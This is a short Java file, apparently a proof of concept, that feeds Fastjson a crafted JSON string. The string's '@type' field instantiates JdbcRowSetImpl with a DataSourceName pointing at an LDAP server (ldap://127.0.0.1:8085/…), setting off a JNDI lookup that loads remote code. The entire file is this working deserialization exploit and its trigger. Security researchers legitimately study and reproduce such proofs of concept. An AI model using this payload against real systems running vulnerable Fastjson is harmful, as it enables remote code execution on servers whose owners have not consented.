package fastjson;

import com.alibaba.fastjson.JSON;

public class FastJsonJdbcRowSetlmpl {
    public static void main(String[] args) throws Exception {
        String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/YJiuMVFF\",\"AutoCommit\":\"false\"}";
        JSON.parseObject(s);
    }
}